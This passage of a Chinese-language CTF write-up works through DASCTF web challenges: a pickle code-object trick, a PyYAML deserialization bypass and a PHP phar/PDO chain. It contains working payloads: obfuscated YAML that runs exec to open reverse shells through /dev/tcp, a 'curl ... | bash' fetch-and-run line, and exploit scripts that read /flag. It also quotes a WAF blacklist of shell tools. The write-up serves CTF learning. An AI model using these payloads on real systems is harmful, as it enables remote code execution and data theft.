class="hljs-string">S&#x27;co_varnames&#x27;</span><br><span class="hljs-string">tRp14</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_filename&#x27;</span><br><span class="hljs-string">tRp15</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_name&#x27;</span><br><span class="hljs-string">tRp16</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_firstlineno&#x27;</span><br><span class="hljs-string">tRp17</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_lnotab&#x27;</span><br><span class="hljs-string">tRp18</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_freevars&#x27;</span><br><span class="hljs-string">tRp19</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_cellvars&#x27;</span><br><span class="hljs-string">tRp20</span><br><span class="hljs-string">ctypes</span><br><span class="hljs-string">CodeType</span><br><span class="hljs-string">(g5</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">g7</span><br><span class="hljs-string">g8</span><br><span class="hljs-string">g9</span><br><span class="hljs-string">g10</span><br><span class="hljs-string">g11</span><br><span class="hljs-string">g12</span><br><span class="hljs-string">g13</span><br><span class="hljs-string">g14</span><br><span class="hljs-string">g15</span><br><span class="hljs-string">g16</span><br><span class="hljs-string">g17</span><br><span class="hljs-string">g18</span><br><span class="hljs-string">g19</span><br><span class="hljs-string">g20</span><br><span class="hljs-string">tRp21</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&quot;__code__&quot;</span><br><span class="hljs-string">g21</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>获取<code>builtins</code>的<code>getattr</code>方法,通过<code>getattr</code>获取到<code>src</code>的<code>__code__</code>,继而获得<code>co_const</code>等参数,获取<code>builtins</code>的<code>setattr</code>,修改<code>__code__</code>为新的<code>CodeType</code>。</p><h2 id="yaml-matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h2><p>给出了源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>又是绕waf，这里可以用直接用exec打新版pyyaml，中间用一下十六进制就好了。</p><ol><li>构造yaml文件</li></ol><p>直接用type+tuple：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>    args:<br>     - exp<br>     - !!python/<span class="hljs-built_in">tuple</span> []<br>     - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>    listitems: |<br>    <span class="hljs-string">&#x27;python code&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><br><span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-type">!!python/tuple</span> [], &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;]<br><br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;exec(bytes.fromhex(&#x27;5f5f696d706f72745f5f28276f7327292e73797374656d282762617368202d63205c27657865632062617368202d69203e26202f6465762f7463702f7670732f706f727420303e263120323e26315c272729&#x27;).decode())&quot;</span><br></code></pre></td></tr></table></figure><p>其中hex部分base64解码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;bash -c \&#x27;exec bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1 2&gt;&amp;1\&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>上传后直接打：</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207174334564.png" alt="image-20250207174334564"></p><p>官方wp使用的是通过Server请求头带出命令回显</p><p><code>werkzeug.serving.WSGIRequestHandler</code>这个处理器是用来处理请求头的</p><p><code>Server</code>头的值是<code>server_version</code>属性和<code>sys_version</code>属性拼接在一起的</p><p>那我们只需要想办法修改<code>server_version</code>属性或者<code>sys_version</code>属性即可带出数据了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> werkzeug<br><span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,<span class="hljs-string">&#x27;想要带出的数据&#x27;</span> )<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>        args:<br>         - exp<br>         - !!python/<span class="hljs-built_in">tuple</span> []<br>         - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>        listitems: |<br>         bb=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br>         <span class="hljs-keyword">import</span> werkzeug<br>         <span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,bb )<br></code></pre></td></tr></table></figure><p>然后发包查看<code>HTTPheaders</code>就行了。</p><p>当然绕过的方法千奇百怪，像这种<code>bytes([]).decode()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>args: [<span class="hljs-string">&#x27;z&#x27;</span>, !!python/<span class="hljs-built_in">tuple</span> [], &#123;<span class="hljs-string">&#x27;extend&#x27;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;]<br>listitems: <span class="hljs-string">&#x27;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,105,112,47,112,111,114,116,32,48,62,38,49,34]).decode())&#x27;</span><br><span class="hljs-comment"># __import__(&#x27;os&#x27;).__getattribute__(&#x27;system&#x27;)(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;)</span><br></code></pre></td></tr></table></figure><p>还有：<a href="https://xz.aliyun.com/t/13281?time__1311=GqmxuD0DnD9D2iDlh+t0=KcDWqYvj+RIbpD#toc-6%E7%9A%84%E5%80%9F%E9%89%B4%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%9C%8B%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%EF%BC%9A">https://xz.aliyun.com/t/13281?time__1311=GqmxuD0DnD9D2iDlh+t0=KcDWqYvj+RIbpD#toc-6的借鉴，可以看看绕过思路：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;curl http://shell.txt|bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;exec(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]in[[<span class="hljs-subst">&#123;i&#125;</span>]]and[j]in[[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]]))&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>args:<br>  - exp<br>  - !!python/<span class="hljs-built_in">tuple</span> []<br>  - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>listitems: <span class="hljs-string">&quot;上面的脚本输出的结果&quot;</span><br></code></pre></td></tr></table></figure><p>有兴趣可以继续研究研究。</p><h2 id="strange-php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h2><p>1解题，应该是最开始研究这个trick的师傅做出来了。</p><p>这道题<code>path</code>可控，肯定是打<code>phar</code>，这不难想到，因为文件上传+php反序列化+unlink触发点基本没跑了。</p><p>思路在此：</p><p><a href="https://www.cnblogs.com/cyyyyi/p/17947698">ctfshow元旦水友赛web easy_login详解 - cyyyyi - 博客园</a></p><p>主逻辑是有任意txt写和删除功能。</p><p>从<code>User.php</code>和<code>UserMessage.php</code>可以找出一条反序列化链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">try</span>&#123;<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = :username&quot;</span>;<br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>(<span class="hljs-string">&#x27;:username&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;username);<br>    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>  &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>  &#125;<br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username)&#123;<br>      <span class="hljs-variable">$results</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();<br>      <span class="hljs-variable">$log_mess</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$results</span>);<br><br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;username).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$log_mess</span>.<span class="hljs-string">&quot;\n&quot;</span>, FILE_APPEND);<br><br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;clean)&#123;<br>      <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm log/* txt/*&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$value</span>;<br>    <span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/log/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$a</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>接下来需要构造数据库触发这里的<code>__set</code>魔术方法，这样就可以任意文件存取了。</p><p>需要打的部分就是这个<code>ATTR_DEFAULT_FETCH_MODE</code>。</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207182539727.png" alt="image-20250207182539727"></p><p>参考：<a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p>不出网的情况下当然是要选择<code>sqlite</code>这种基于文件的数据库，如果出网也可以直接连到<code>vps</code>上的<code>mysql</code>。</p><p>通过User::__destruct<code>-&gt;</code>User::log ,User::log指定查询数据库来源，设定<code>&quot;options&quot;=&gt;[PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_CLASS|PDO::FETCH_CLASSTYPE,]]</code>,使得查询结果，第一列返回结果作为类名实例化，之后的结果会变成属性名和属性值进行赋值，对于未定义的属性会触发这个类的<code>__set</code>方法。数据库第一行结果为<code>UserMessage</code>,所以会实例化<code>UserMessage</code>。</p><p>用python生成个<code>sqlite</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> base64<br><br>path = <span class="hljs-string">&quot;test.db&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_db</span>(<span class="hljs-params">db_path</span>):<br>    conn = sqlite3.connect(db_path)<br>    cursor = conn.cursor()<br>    cursor.execute(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    CREATE TABLE IF NOT EXISTS users (</span><br><span class="hljs-string"></span><br><span class="hljs-string">        username TEXT NOT NULL,</span><br><span class="hljs-string">        filePath TEXT NOT NULL,</span><br><span class="hljs-string">        password TEXT NOT NULL,</span><br><span class="hljs-string"></span><br><span class="hljs-string">        id INTEGER PRIMARY KEY AUTOINCREMENT</span><br><span class="hljs-string">    )</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>    users = [<br>        (<span class="hljs-string">&#x27;UserMessage&#x27;</span>, <span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;/flag&#x27;</span>),<br>    ]<br>    cursor.executemany(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    INSERT INTO users (username, password,filePath) VALUES (?,?,?)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, users)<br>    conn.commit()<br>    cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>)<br>    conn.close()<br><br>gen_db(path)<br><br>origin_data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.db&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read();<br><span class="hljs-built_in">print</span>(base64.b64encode(origin_data))<br></code></pre></td></tr></table></figure><p>我们将filePath赋值为&#x2F;flag，之后的变量，password和id，由于未被定义会触发<code>__set</code>，从而读取&#x2F;flag。</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193349391.png" alt="image-20250207193349391"></p><p>然后就是写入sqlite文件，修改php文件的数据源生成phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = []; <span class="hljs-comment">//use to set options of PDO connections</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;con_options = [<br>            <span class="hljs-string">&quot;dsn&quot;</span> =&gt; <span class="hljs-string">&#x27;sqlite:/var/www/html/txt/4e118980578d4c903bd6a36b51c93da1.txt&#x27;</span>,<br>            <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;options&quot;</span> =&gt; [PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="hljs-variable constant_">FETCH_CLASS</span> | PDO::<span 